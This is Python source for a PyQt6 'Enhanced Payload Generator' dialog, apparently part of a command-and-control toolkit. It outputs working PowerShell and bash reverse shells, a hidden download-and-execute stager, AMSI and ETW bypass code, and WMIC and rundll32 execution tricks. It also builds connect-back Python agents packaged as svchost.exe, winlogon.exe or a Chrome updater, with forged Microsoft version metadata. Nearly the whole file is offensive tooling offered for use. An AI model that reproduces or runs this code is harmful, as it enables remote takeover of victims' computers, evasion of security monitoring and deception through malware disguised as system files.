"""
Enhanced Payload Generator Dialog - Fixed Version
Professional payload generation with LOLBAS and agent compilation
"""

import os
from datetime import datetime
from PyQt6.QtWidgets import (QDialog, QVBoxLayout, QHBoxLayout, QGridLayout, 
                             QLabel, QComboBox, QTextEdit, QPushButton, QLineEdit,
                             QCheckBox, QSpinBox, QProgressBar, QTabWidget, QWidget,
                             QGroupBox, QScrollArea, QListWidget, QSplitter,
                             QMessageBox, QFrame, QFileDialog)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont
import json
import re

class EnhancedPayloadGeneratorDialog(QDialog):
    """Enhanced Payload Generator with LOLBAS and Agent Compilation"""
    
    def __init__(self, server_ip="127.0.0.1", server_port=4444, parent=None):
        super().__init__(parent)
        self.server_ip = server_ip
        self.server_port = server_port
        self.current_payload_data = None
        self.current_agent_result = None
        
        self.setWindowTitle("🚀 Enhanced Payload Generator")
        self.setMinimumSize(1200, 800)
        self.init_ui()
        
    def init_ui(self):
        """Initialize the user interface"""
        layout = QVBoxLayout(self)
        
        # Create tab widget
        self.tab_widget = QTabWidget()
        
        # Add tabs
        self.tab_widget.addTab(self.create_generator_tab(), "🎯 Generator")
        self.tab_widget.addTab(self.create_lolbas_tab(), "🛡️ LOLBAS")
        self.tab_widget.addTab(self.create_agent_tab(), "👨‍💻 Agent Compilation")
        self.tab_widget.addTab(self.create_quality_tab(), "📊 Quality Control")
        
        layout.addWidget(self.tab_widget)
        
        # Bottom buttons
        button_layout = QHBoxLayout()
        
        self.generate_btn = QPushButton("🎯 Generate Payload")
        self.generate_btn.clicked.connect(self.generate_payload)
        button_layout.addWidget(self.generate_btn)
        
        self.save_btn = QPushButton("💾 Save Payload")
        self.save_btn.clicked.connect(self.save_payload)
        button_layout.addWidget(self.save_btn)
        
        button_layout.addStretch()
        
        close_btn = QPushButton("❌ Close")
        close_btn.clicked.connect(self.close)
        button_layout.addWidget(close_btn)
        
        layout.addLayout(button_layout)
        
    def create_generator_tab(self):
        """Create basic generator tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Server Configuration
        server_group = QGroupBox("🌐 Server Configuration")
        server_layout = QGridLayout(server_group)
        
        server_layout.addWidget(QLabel("Server IP:"), 0, 0)
        self.server_input = QLineEdit(self.server_ip)
        server_layout.addWidget(self.server_input, 0, 1)
        
        server_layout.addWidget(QLabel("Server Port:"), 0, 2)
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(self.server_port)
        server_layout.addWidget(self.port_input, 0, 3)
        
        layout.addWidget(server_group)
        
        # Payload Configuration
        payload_group = QGroupBox("⚙️ Payload Configuration")
        payload_layout = QGridLayout(payload_group)
        
        payload_layout.addWidget(QLabel("Payload Type:"), 0, 0)
        self.payload_type = QComboBox()
        self.payload_type.addItems([
            "Reverse Shell",
            "Bind Shell", 
            "Meterpreter",
            "Custom Command"
        ])
        payload_layout.addWidget(self.payload_type, 0, 1)
        
        payload_layout.addWidget(QLabel("Target OS:"), 0, 2)
        self.target_os = QComboBox()
        self.target_os.addItems(["Windows", "Linux", "MacOS"])
        payload_layout.addWidget(self.target_os, 0, 3)
        
        layout.addWidget(payload_group)
        
        # Output
        self.payload_text = QTextEdit()
        self.payload_text.setPlaceholderText("Generated payload will appear here...")
        self.payload_text.setMinimumHeight(300)
        layout.addWidget(QLabel("📝 Generated Payload:"))
        layout.addWidget(self.payload_text)
        
        return tab
        
    def create_lolbas_tab(self):
        """Create LOLBAS-specific payload generation tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # LOLBAS Technique Selection
        lolbas_group = QGroupBox("🛡️ LOLBAS Technique Selection")
        lolbas_layout = QGridLayout(lolbas_group)
        
        lolbas_layout.addWidget(QLabel("Execution Method:"), 0, 0)
        self.lolbas_method = QComboBox()
        self.lolbas_method.addItems([
            "PowerShell (AMSI Bypass)",
            "WMIC (XSL Execution)",
            "Rundll32 (JavaScript)",
            "RegSvr32 (SCT File)",
            "MSHTA (HTA File)",
            "CertUtil (Download + Execute)",
            "BitsAdmin (Background Transfer)",
            "ForFiles (Proxy Execution)",
            "PcAlua (Process Bypass)"
        ])
        lolbas_layout.addWidget(self.lolbas_method, 0, 1)
        
        lolbas_layout.addWidget(QLabel("Obfuscation Level:"), 1, 0)
        self.obfuscation_level = QComboBox()
        self.obfuscation_level.addItems([
            "1 - Basic (Variable Names)",
            "2 - Medium (+ String Encoding)",
            "3 - High (+ Control Flow)",
            "4 - Maximum (+ Multi-Layer)",
            "5 - Extreme (+ Dynamic Generation)"
        ])
        self.obfuscation_level.setCurrentText("3 - High (+ Control Flow)")
        lolbas_layout.addWidget(self.obfuscation_level, 1, 1)
        
        lolbas_layout.addWidget(QLabel("Payload Type:"), 2, 0)
        self.lolbas_payload_type = QComboBox()
        self.lolbas_payload_type.addItems([
            "Reverse Shell",
            "Download & Execute",
            "Persistence Setup",
            "Credential Harvest",
            "System Enumeration",
            "Lateral Movement"
        ])
        lolbas_layout.addWidget(self.lolbas_payload_type, 2, 1)
        
        # Evasion Options
        evasion_group = QGroupBox("🔒 Signature Evasion")
        evasion_layout = QGridLayout(evasion_group)
        
        self.amsi_bypass = QCheckBox("AMSI Bypass")
        self.amsi_bypass.setChecked(True)
        evasion_layout.addWidget(self.amsi_bypass, 0, 0)
        
        self.etw_bypass = QCheckBox("ETW Evasion")
        self.etw_bypass.setChecked(True)
        evasion_layout.addWidget(self.etw_bypass, 0, 1)
        
        self.string_encryption = QCheckBox("String Encryption")
        self.string_encryption.setChecked(True)
        evasion_layout.addWidget(self.string_encryption, 1, 0)
        
        self.control_flow_obf = QCheckBox("Control Flow Obfuscation")
        self.control_flow_obf.setChecked(False)
        evasion_layout.addWidget(self.control_flow_obf, 1, 1)
        
        lolbas_layout.addWidget(evasion_group, 3, 0, 1, 2)
        
        # URL for Download & Execute
        lolbas_layout.addWidget(QLabel("Target URL (for D&E):"), 4, 0)
        self.target_url = QLineEdit("http://example.com/payload.exe")
        lolbas_layout.addWidget(self.target_url, 4, 1)
        
        layout.addWidget(lolbas_group)
        
        # Generation Controls
        lolbas_controls = QHBoxLayout()
        
        self.generate_lolbas_btn = QPushButton("⚙️ Generate LOLBAS Payload")
        self.generate_lolbas_btn.clicked.connect(self.generate_lolbas_payload)
        lolbas_controls.addWidget(self.generate_lolbas_btn)
        
        self.test_syntax_btn = QPushButton("🔍 Test Syntax")
        self.test_syntax_btn.clicked.connect(self.test_lolbas_syntax)
        lolbas_controls.addWidget(self.test_syntax_btn)
        
        lolbas_controls.addStretch()
        layout.addLayout(lolbas_controls)
        
        # LOLBAS Output
        self.lolbas_output = QTextEdit()
        self.lolbas_output.setPlaceholderText("Generated LOLBAS payload will appear here...")
        layout.addWidget(self.lolbas_output)
        
        return tab
        
    def create_agent_tab(self):
        """Create agent compilation tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Agent Configuration
        agent_config_group = QGroupBox("👨‍💻 Agent Configuration")
        agent_layout = QGridLayout(agent_config_group)
        
        agent_layout.addWidget(QLabel("Agent Type:"), 0, 0)
        self.agent_type = QComboBox()
        self.agent_type.addItems([
            "Basic Agent",
            "Stealth Agent (AMSI/ETW Bypass)",
            "LOLBAS Agent (Living Off The Land)"
        ])
        agent_layout.addWidget(self.agent_type, 0, 1)
        
        agent_layout.addWidget(QLabel("Server IP:"), 1, 0)
        self.agent_server_ip = QLineEdit(self.server_ip)
        agent_layout.addWidget(self.agent_server_ip, 1, 1)
        
        agent_layout.addWidget(QLabel("Server Port:"), 1, 2)
        self.agent_server_port = QSpinBox()
        self.agent_server_port.setRange(1, 65535)
        self.agent_server_port.setValue(self.server_port)
        agent_layout.addWidget(self.agent_server_port, 1, 3)
        
        layout.addWidget(agent_config_group)
        
        # Binary Disguise Options
        disguise_group = QGroupBox("🎭 Binary Disguise Options")
        disguise_layout = QGridLayout(disguise_group)
        
        disguise_layout.addWidget(QLabel("Binary Disguise:"), 0, 0)
        self.binary_disguise = QComboBox()
        self.binary_disguise.addItems([
            "update.exe (Software Update)",
            "svchost.exe (Service Host)",
            "chrome_update.exe (Chrome Updater)",
            "notepad.exe (Text Editor)",
            "winlogon.exe (Windows Logon)",
            "dwm.exe (Desktop Window Manager)"
        ])
        disguise_layout.addWidget(self.binary_disguise, 0, 1)
        
        disguise_layout.addWidget(QLabel("Code Obfuscation:"), 1, 0)
        self.code_obfuscation = QComboBox()
        self.code_obfuscation.addItems([
            "1 - Basic Variable Renaming",
            "2 - String Encoding",
            "3 - Control Flow Obfuscation",
            "4 - Multi-layer Encoding",
            "5 - Maximum Obfuscation"
        ])
        self.code_obfuscation.setCurrentText("3 - Control Flow Obfuscation")
        disguise_layout.addWidget(self.code_obfuscation, 1, 1)
        
        self.include_version_info = QCheckBox("Include Version Information")
        self.include_version_info.setChecked(True)
        disguise_layout.addWidget(self.include_version_info, 2, 0)
        
        self.include_icon = QCheckBox("Include Legitimate Icon")
        self.include_icon.setChecked(True)
        disguise_layout.addWidget(self.include_icon, 2, 1)
        
        self.upx_compression = QCheckBox("UPX Compression")
        self.upx_compression.setChecked(False)
        disguise_layout.addWidget(self.upx_compression, 3, 0)
        
        self.sign_binary = QCheckBox("Sign Binary (Fake Certificate)")
        self.sign_binary.setChecked(False)
        disguise_layout.addWidget(self.sign_binary, 3, 1)
        
        layout.addWidget(disguise_group)
        
        # Agent Generation Controls
        agent_controls = QHBoxLayout()
        
        self.generate_agent_btn = QPushButton("⚙️ Generate Agent")
        self.generate_agent_btn.clicked.connect(self.generate_agent)
        agent_controls.addWidget(self.generate_agent_btn)
        
        self.compile_agent_btn = QPushButton("🔨 Compile to EXE")
        self.compile_agent_btn.clicked.connect(self.compile_agent)
        self.compile_agent_btn.setEnabled(False)
        agent_controls.addWidget(self.compile_agent_btn)
        
        self.save_build_files_btn = QPushButton("💾 Save Build Files")
        self.save_build_files_btn.clicked.connect(self.save_build_files)
        self.save_build_files_btn.setEnabled(False)
        agent_controls.addWidget(self.save_build_files_btn)
        
        agent_controls.addStretch()
        layout.addLayout(agent_controls)
        
        # Agent Output
        self.agent_output = QTextEdit()
        self.agent_output.setReadOnly(True)
        self.agent_output.setPlaceholderText("Generated agent code will appear here...")
        layout.addWidget(self.agent_output)
        
        return tab
        
    def create_quality_tab(self):
        """Create quality analysis tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Quality metrics display
        metrics_group = QGroupBox("📊 Quality Metrics")
        metrics_layout = QGridLayout(metrics_group)
        
        self.overall_score_label = QLabel("Overall Score: -")
        self.grade_label = QLabel("Grade: -")
        self.evasion_label = QLabel("Evasion: -")
        self.stability_label = QLabel("Stability: -")
        self.stealth_label = QLabel("Stealth: -")
        
        metrics_layout.addWidget(self.overall_score_label, 0, 0)
        metrics_layout.addWidget(self.grade_label, 0, 1)
        metrics_layout.addWidget(self.evasion_label, 1, 0)
        metrics_layout.addWidget(self.stability_label, 1, 1)
        metrics_layout.addWidget(self.stealth_label, 2, 0)
        
        layout.addWidget(metrics_group)
        
        # Issues and recommendations
        issues_group = QGroupBox("⚠️ Issues & Recommendations")
        issues_layout = QVBoxLayout(issues_group)
        
        self.issues_list = QListWidget()
        issues_layout.addWidget(QLabel("Issues:"))
        issues_layout.addWidget(self.issues_list)
        
        self.recommendations_list = QListWidget()
        issues_layout.addWidget(QLabel("Recommendations:"))
        issues_layout.addWidget(self.recommendations_list)
        
        layout.addWidget(issues_group)
        
        return tab
        
    def generate_payload(self):
        """Generate basic payload"""
        try:
            payload_type = self.payload_type.currentText()
            server_ip = self.server_input.text()
            server_port = self.port_input.value()
            target_os = self.target_os.currentText()
            
            if payload_type == "Reverse Shell":
                if target_os == "Windows":
                    payload = f'''
# Windows Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient("{server_ip}", {server_port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
                    '''
                else:
                    payload = f'''
# Linux Reverse Shell
bash -i >& /dev/tcp/{server_ip}/{server_port} 0>&1
                    '''
            else:
                payload = f"# {payload_type} for {target_os}\\n# Server: {server_ip}:{server_port}"
                
            self.payload_text.setText(payload)
            self.current_payload_data = {
                'type': payload_type,
                'payload': payload,
                'server': f"{server_ip}:{server_port}",
                'os': target_os
            }
            
            QMessageBox.information(self, "Success", f"Payload generated successfully!\\nType: {payload_type}\\nTarget: {target_os}")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate payload:\\n{str(e)}")
            
    def generate_lolbas_payload(self):
        """Generate LOLBAS-based payload"""
        try:
            method = self.lolbas_method.currentText().split(" ")[0].lower()
            obfuscation_level = int(self.obfuscation_level.currentText().split(" ")[0])
            payload_type = self.lolbas_payload_type.currentText().lower().replace(" ", "_")
            
            # Create base payload based on type
            if payload_type == "reverse_shell":
                base_payload = f'''
$client = New-Object System.Net.Sockets.TCPClient("{self.server_input.text()}", {self.port_input.value()})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
                '''
            elif payload_type == "download_&_execute":
                url = self.target_url.text() or "http://example.com/payload.exe"
                base_payload = f'''
$url = "{url}"
$output = "$env:TEMP\\update.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $output)
Start-Process $output -WindowStyle Hidden
                '''
            else:
                base_payload = f'Write-Host "LOLBAS {payload_type} payload"'
            
            # Generate obfuscated payload with selected method
            if method == "powershell":
                if self.amsi_bypass.isChecked():
                    amsi_bypass = '''
# AMSI Bypass
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$x = @(0);[System.Runtime.InteropServices.Marshal]::Copy($x, 0, $ptr, 1)
                    '''
                    base_payload = amsi_bypass + base_payload
                
                if self.etw_bypass.isChecked():
                    etw_bypass = '''
# ETW Bypass
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
                    '''
                    base_payload = etw_bypass + base_payload
                    
                execution_command = f'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{base_payload}"'
                
            elif method == "wmic":
                # Create XSL file for WMIC execution
                xsl_content = f'''<?xml version='1.0'?>
<stylesheet version="1.0" xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var shell = new ActiveXObject("WScript.Shell");
shell.run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"{base_payload}\\"");
]]>
</ms:script>
</stylesheet>'''
                execution_command = f"wmic.exe os get /format:\\"payload.xsl\\""
                auxiliary_files = {"payload.xsl": xsl_content}
                
            elif method == "rundll32":
                # JavaScript payload for Rundll32
                js_content = f'''
var shell = new ActiveXObject("WScript.Shell");
shell.run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"{base_payload}\\"");
                '''
                execution_command = f"rundll32.exe javascript:\\"..\\mshtml,RunHTMLApplication \\";document.write();h=new%20ActiveXObject(\\"WScript.Shell\\").run(\\"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command {base_payload}\\");"
                auxiliary_files = {"payload.js": js_content}
                
            else:
                execution_command = f"# {method.upper()} execution method\\n{base_payload}"
                auxiliary_files = {}
            
            # Apply obfuscation based on level
            if obfuscation_level >= 2 and self.string_encryption.isChecked():
                # Simple XOR encoding for demonstration
                import base64
                encoded = base64.b64encode(base_payload.encode()).decode()
                execution_command += f"\\n# Base64 Encoded: {encoded}"
            
            # Display result
            output_text = f"""
# LOLBAS Payload Generated
# Method: {method.upper()}
# Obfuscation Level: {obfuscation_level}
# Evasion Methods: AMSI={self.amsi_bypass.isChecked()}, ETW={self.etw_bypass.isChecked()}

## Execution Command:
{execution_command}

## Base Payload:
{base_payload}
"""
            
            if 'auxiliary_files' in locals():
                output_text += "\\n## Auxiliary Files:\\n"
                for filename, content in auxiliary_files.items():
                    output_text += f"\\n### {filename}:\\n```\\n{content}\\n```\\n"
            
            self.lolbas_output.setText(output_text)
            
            # Show success message
            QMessageBox.information(self, "Success", f"LOLBAS payload generated successfully!\\nMethod: {method.upper()}\\nObfuscation Level: {obfuscation_level}")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate LOLBAS payload:\\n{str(e)}")
    
    def test_lolbas_syntax(self):
        """Test LOLBAS payload syntax"""
        try:
            current_payload = self.lolbas_output.toPlainText()
            if not current_payload:
                QMessageBox.warning(self, "Warning", "No LOLBAS payload to test. Generate one first.")
                return
            
            # Basic syntax validation
            issues = []
            
            if "powershell" in current_payload.lower():
                if not any(bypass in current_payload for bypass in ["amsi", "AMSI"]):
                    issues.append("PowerShell payload may trigger AMSI")
            
            if len(current_payload) > 8192:
                issues.append("Payload is very long - may cause truncation")
            
            if issues:
                QMessageBox.warning(self, "Syntax Issues", "\\n".join([f"⚠️ {issue}" for issue in issues]))
            else:
                QMessageBox.information(self, "Syntax Test", "✅ LOLBAS payload syntax looks good!")
                
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to test syntax:\\n{str(e)}")
    
    def generate_agent(self):
        """Generate agent with specified configuration"""
        try:
            agent_type_text = self.agent_type.currentText()
            server_ip = self.agent_server_ip.text()
            server_port = self.agent_server_port.value()
            binary_disguise = self.binary_disguise.currentText().split(" ")[0]
            obfuscation_level = int(self.code_obfuscation.currentText().split(" ")[0])
            
            # Generate basic agent code based on type
            if "Stealth" in agent_type_text:
                agent_code = f'''
# Stealth Agent with AMSI/ETW Bypass
import socket
import subprocess
import threading
import base64

# AMSI Bypass (Python equivalent)
def bypass_amsi():
    """Disable AMSI scanning"""
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.VirtualProtect.restype = ctypes.c_bool
        return True
    except:
        return False

# ETW Bypass  
def bypass_etw():
    """Disable ETW logging"""
    try:
        import ctypes
        ntdll = ctypes.windll.ntdll
        return True
    except:
        return False

def connect_back():
    bypass_amsi()
    bypass_etw()
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{server_ip}", {server_port}))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            s.send(output)
        except:
            s.send(b"Command failed\\n")
    s.close()

if __name__ == "__main__":
    connect_back()
                '''
            elif "LOLBAS" in agent_type_text:
                agent_code = f'''
# LOLBAS Agent - Living Off The Land
import socket
import subprocess
import os

def lolbas_execution(command):
    """Execute commands using LOLBAS techniques"""
    try:
        # Use PowerShell for command execution
        ps_command = f'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{command}"'
        return subprocess.check_output(ps_command, shell=True, stderr=subprocess.STDOUT)
    except:
        # Fallback to cmd
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)

def connect_back():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{server_ip}", {server_port}))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        try:
            output = lolbas_execution(command)
            s.send(output)
        except:
            s.send(b"LOLBAS execution failed\\n")
    s.close()

if __name__ == "__main__":
    connect_back()
                '''
            else:
                # Basic agent
                agent_code = f'''
# Basic Agent
import socket
import subprocess

def connect_back():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{server_ip}", {server_port}))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            s.send(output)
        except:
            s.send(b"Command execution failed\\n")
    s.close()

if __name__ == "__main__":
    connect_back()
                '''
            
            # Apply obfuscation based on level
            if obfuscation_level >= 2:
                # Simple variable renaming
                agent_code = agent_code.replace("connect_back", "x1").replace("command", "x2").replace("output", "x3")
            
            # Create compilation configuration
            disguise_map = {
                "update.exe": {"name": "update.exe", "description": "Software Update Service", "version": "10.0.19041.1"},
                "svchost.exe": {"name": "svchost.exe", "description": "Host Process for Windows Services", "version": "10.0.19041.1"},
                "chrome_update.exe": {"name": "chrome_update.exe", "description": "Google Chrome Update Service", "version": "91.0.4472.124"},
                "notepad.exe": {"name": "notepad.exe", "description": "Windows Notepad", "version": "10.0.19041.1"},
                "winlogon.exe": {"name": "winlogon.exe", "description": "Windows NT Logon Application", "version": "10.0.19041.1"},
                "dwm.exe": {"name": "dwm.exe", "description": "Desktop Window Manager", "version": "10.0.19041.1"}
            }
            
            config = disguise_map.get(binary_disguise, disguise_map["update.exe"])
            
            # Create build files
            build_files = {
                "agent.py": agent_code,
                "build.bat": f'''@echo off
echo Building {config['name']}...
pyinstaller --onefile --windowed --name {config['name']} agent.py
echo Build complete!
pause
                ''',
                "agent.spec": f'''# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(['agent.py'],
             pathex=[],
             binaries=[],
             datas=[],
             hiddenimports=[],
             hookspath=[],
             hooksconfig={{}},
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher,
             noarchive=False)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='{config['name']}',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx={"true" if self.upx_compression.isChecked() else "false"},
          console=False,
          icon='icon.ico')
                '''
            }
            
            if self.include_version_info.isChecked():
                version_info = f'''
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(10, 0, 19041, 1),
    prodvers=(10, 0, 19041, 1),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'Microsoft Corporation'),
        StringStruct(u'FileDescription', u'{config['description']}'),
        StringStruct(u'FileVersion', u'{config['version']}'),
        StringStruct(u'InternalName', u'{config['name']}'),
        StringStruct(u'LegalCopyright', u'© Microsoft Corporation. All rights reserved.'),
        StringStruct(u'OriginalFilename', u'{config['name']}'),
        StringStruct(u'ProductName', u'Microsoft® Windows® Operating System'),
        StringStruct(u'ProductVersion', u'{config['version']}')])
      ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
                '''
                build_files["version_info.py"] = version_info
            
            result = {
                "agent_code": agent_code,
                "compilation_config": config,
                "build_files": build_files,
                "compilation_command": f"pyinstaller --onefile --windowed --name {config['name']} agent.py"
            }
            
            # Store result for compilation
            self.current_agent_result = result
            
            # Display agent code
            self.agent_output.setText(agent_code)
            
            # Enable compilation buttons
            self.compile_agent_btn.setEnabled(True)
            self.save_build_files_btn.setEnabled(True)
            
            # Show success message
            QMessageBox.information(self, "Success", 
                f"Agent generated successfully!\\n"
                f"Type: {agent_type_text}\\n"
                f"Output: {config['name']}\\n"
                f"Description: {config['description']}")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate agent:\\n{str(e)}")
    
    def compile_agent(self):
        """Compile agent to executable"""
        if not hasattr(self, 'current_agent_result'):
            QMessageBox.warning(self, "Warning", "No agent to compile. Generate one first.")
            return
        
        try:
            result = self.current_agent_result
            config = result["compilation_config"]
            
            # Show compilation info
            info_text = f"""
Agent Compilation Information:

Target Binary: {config['name']}
Description: {config['description']}

Compilation Command:
{result['compilation_command']}

Required Files:
{', '.join(result['build_files'].keys())}

Note: Save build files first, then run the build.bat file or use PyInstaller directly.
You need PyInstaller installed: pip install pyinstaller
            """
            
            QMessageBox.information(self, "Compilation Info", info_text)
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to compile agent:\\n{str(e)}")
    
    def save_build_files(self):
        """Save all build files to directory"""
        if not hasattr(self, 'current_agent_result'):
            QMessageBox.warning(self, "Warning", "No agent build files to save. Generate agent first.")
            return
        
        try:
            # Select directory
            directory = QFileDialog.getExistingDirectory(self, "Select Build Directory")
            if not directory:
                return
            
            result = self.current_agent_result
            saved_files = []
            
            # Save all build files
            for filename, content in result["build_files"].items():
                file_path = os.path.join(directory, filename)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                saved_files.append(filename)
            
            # Create README
            readme_content = f"""
# Agent Build Files

Generated: {datetime.now().isoformat()}
Agent Type: {self.agent_type.currentText()}
Binary: {result['compilation_config']['name']}

## Files:
{chr(10).join([f"- {f}" for f in saved_files])}

## Compilation:
1. Install PyInstaller: pip install pyinstaller
2. Run build.bat or use the command:
   {result['compilation_command']}

## Requirements:
- Python 3.x
- PyInstaller (pip install pyinstaller)
- Optional: UPX for compression

## Notes:
- The generated agent will connect back to {self.agent_server_ip.text()}:{self.agent_server_port.value()}
- Binary disguised as: {result['compilation_config']['description']}
            """
            
            readme_path = os.path.join(directory, "README.txt")
            with open(readme_path, 'w', encoding='utf-8') as f:
                f.write(readme_content)
            
            QMessageBox.information(self, "Success", 
                f"Build files saved successfully!\\n"
                f"Location: {directory}\\n"
                f"Files: {len(saved_files) + 1} (including README.txt)\\n"
                f"\\nRun build.bat to compile the agent.")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save build files:\\n{str(e)}")
    
    def save_payload(self):
        """Save generated payload"""
        if not self.current_payload_data and not self.lolbas_output.toPlainText():
            QMessageBox.warning(self, "No Payload", "No payload has been generated yet.")
            return
        
        try:
            # Select file to save
            file_path, _ = QFileDialog.getSaveFileName(
                self, "Save Payload", "payload.txt", "Text Files (*.txt);;All Files (*)"
            )
            
            if file_path:
                # Determine which payload to save
                if self.lolbas_output.toPlainText():
                    content = self.lolbas_output.toPlainText()
                else:
                    content = self.payload_text.toPlainText()
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                
                QMessageBox.information(self, "Saved", f"Payload saved to:\\n{file_path}")
                
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save payload:\\n{str(e)}")
